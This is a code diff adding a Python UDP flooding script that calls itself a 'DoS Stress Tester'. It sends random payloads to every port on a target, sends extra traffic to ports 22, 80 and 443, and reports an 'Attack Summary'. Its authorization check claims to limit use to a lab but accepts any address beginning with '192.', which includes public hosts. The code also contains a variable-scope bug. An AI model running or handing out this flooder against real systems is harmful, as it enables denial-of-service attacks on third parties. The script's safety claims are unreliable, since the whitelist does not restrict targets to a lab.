@@ -1,0 +1,138 @@
+#!/usr/bin/env python3
+import socket
+import random
+import threading
+import time
+import sys
+import psutil  # For resource monitoring
+from datetime import datetime
+
+# === Configuration === #
+VERSION = "4.0"
+THREADS = 10                      # Adjust based on CPU cores
+PACKET_SIZES = [64, 128, 512, 1024]  # MTU variations 
+SKIP_PORTS = {1900}               # Avoid SSDP for safety
+CRITICAL_PORTS = {80, 443, 22}    # Prioritize common services
+MAX_PPS = 1000                    # Packets/second limit (per thread)
+DURATION_SEC = 300                # Auto-stop after 5 minutes (safety)
+
+# === Globals === #
+packets_sent = 0
+running = True
+start_time = time.time()
+
+# === Logging === #
+def log(event: str):
+    """Timestamped logging with thread safety"""
+    print(f"[{datetime.now().strftime('%H:%M:%S')}] {event}")
+
+# === Network Utilities === #
+
+def is_authorized(target_ip: str) -> bool:
+    """Check if target is whitelisted (critical for legal use)"""
+    AUTHORIZED_IPS = {"192.168.1.100", "10.0.0.2"}  # Your lab IPs
+    return target_ip in AUTHORIZED_IPS or target_ip.startswith("192.")
+
+# === Flooding Core === #
+def flood_target(target_ip: str, port_range: tuple):
+    global packets_sent
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.settimeout(0.1)  # Adjust based on network latency
+    
+    while running and (time.time() - start_time < DURATION_SEC):
+        try:
+            for port in range(*port_range):
+                if port in SKIP_PORTS:
+                    continue
+                
+                # Dynamic packet size and rate control
+                payload = random._urandom(random.choice(PACKET_SIZES))
+                target_port = port
+                
+                # Prioritize critical ports (2x packets)
+                if port in CRITICAL_PORTS:
+                    sock.sendto(payload, (target_ip, target_port))
+                    packets_sent += 1
+                
+                # Throttle to avoid self-DoS
+                current_pps = packets_sent / (time.time() - start_time + 1)
+                if current_pps > MAX_PPS:
+                    time.sleep(0.001)
+                
+                sock.sendto(payload, (target_ip, target_port))
+                packets_sent += 1
+                
+        except Exception as e:
+            log(f"Thread error: {str(e)}")
+    
+    sock.close()
+
+# === Main Program === #
+def main():
+    global running
+    
+    # ---- Authorization Check ---- #
+    print(f"\n\033[36m DoS Stress Tester v{VERSION} \033[0m")
+    target_ip = input(" Target IP (localhost/test lab only): ").strip()
+    
+    if not is_authorized(target_ip):
+        sys.exit("\033[91m Unauthorized target - use lab IPs only\033[0m")
+    
+    # ---- Attack Confirmation ---- #
+    print(f"\n\033[31mWARNING: This will flood ALL ports on {target_ip}")
+    print("         Auto-stops after", DURATION_SEC//60, "minutes\033[0m")
+    if input("\nType 'CONFIRM' to proceed: ").upper() != "CONFIRM":
+        sys.exit(" Cancelled by user")
+    
+    # ---- Resource Check ---- #
+    if psutil.cpu_percent() > 80:
+        log(" High CPU usage - reduce threads or wait")
+        THREADS = max(THREADS // 2, 2)
+    
+    # ---- Thread Launch ---- #
+    ports_per_thread = 65535 // THREADS
+    threads = []
+    log(f"Starting {THREADS} threads ({MAX_PPS*THREADS:,} pps max)...")
+    
+    for i in range(THREADS):
+        start = i * ports_per_thread + 1
+        end = (i + 1) * ports_per_thread
+        t = threading.Thread(
+            target=flood_target,
+            args=(target_ip, (start, end)),
+            daemon=True
+        )
+        t.start()
+        threads.append(t)
+        log(f"Thread {i+1} ▶ Ports {start}-{end}")
+    
+    # ---- Progress Monitoring ---- #
+    try:
+        while running:
+            elapsed = time.time() - start_time
+            if elapsed > DURATION_SEC:
+                log(" Auto-stop: Duration limit reached")
+                running = False
+                break
+            
+            log(f"Stats: {packets_sent:,} packets | " 
+                f"{packets_sent/elapsed:,.0f} pps | "
+                f"{elapsed:.0f}/{DURATION_SEC}s")
+            time.sleep(5)
+            
+    except KeyboardInterrupt:
+        log("\n Stopping attack...")
+    finally:
+        running = False
+        for t in threads:
+            t.join(timeout=2)
+        
+        # Generate Final Report
+        log(f"\n Attack Summary:\n"
+            f"- Target: {target_ip}\n"
+            f"- Duration: {time.time() - start_time:.1f}s\n"
+            f"- Packets sent: {packets_sent:,}\n"
+            f"- Avg rate: {packets_sent/(time.time() - start_time):,.1f} pps")
+
+if __name__ == "__main__":
+    main()
